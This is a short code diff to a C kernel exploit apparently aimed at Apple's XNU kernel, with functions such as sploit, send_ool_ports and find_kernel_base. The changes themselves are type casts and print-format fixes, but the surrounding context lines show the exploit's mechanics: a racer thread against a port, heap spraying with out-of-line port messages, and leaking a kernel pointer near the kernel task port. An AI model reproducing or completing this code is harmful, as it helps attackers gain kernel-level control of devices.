@@ -154,7 +154,7 @@ mach_port_t send_ool_ports(mach_port_t to_send) {
   
   for (int i = 0; i < 1000; i++) {
     leak_msg->ool_ports[i].address = ports;
-    leak_msg->ool_ports[i].count = n_ports;
+    leak_msg->ool_ports[i].count = (mach_msg_size_t)n_ports;
     leak_msg->ool_ports[i].deallocate = 0;
     leak_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
     leak_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
@@ -388,9 +388,6 @@ uint64_t find_kernel_base(mach_port_t ktp, uint64_t hostport_addr, uint64_t* _re
 }
 
 mach_port_t sploit(mach_port_t host_priv, uint64_t* kernel_base, uint64_t* realhost) {
-  kern_return_t err;
-
-  
   // we can also use the host_priv port for this, also give us the advantage of
   // locating the kernel more easily via realhost later
   
@@ -430,7 +427,7 @@ mach_port_t sploit(mach_port_t host_priv, uint64_t* kernel_base, uint64_t* realh
   printf("stashed ports\n");
   
   pthread_t racer_thread;
-  pthread_create(&racer_thread, NULL, dp_control_port_racer_thread, (void*)host_priv);
+  pthread_create(&racer_thread, NULL, dp_control_port_racer_thread, (void*)(uintptr_t)host_priv);
   
   for(int i = 0 ; i < n_middle_ports; i++) {
     prepare_port(middle_ports[i], host_priv);
@@ -466,9 +463,9 @@ mach_port_t sploit(mach_port_t host_priv, uint64_t* kernel_base, uint64_t* realh
     ool_port_qs[i] = send_ool_ports(host_priv);
   }
   
-  uint64_t context = 123;
+  mach_port_context_t context = 123;
   mach_port_get_context(mach_task_self(), middle_ports[0], &context);
-  printf("read context value: 0x%llx\n", context);
+  printf("read context value: 0x%lx\n", context);
   
   // we disclosed a pointer which is on the same three pages as the kernel task port
   // work out the base of that region then set the contexts of all the middle
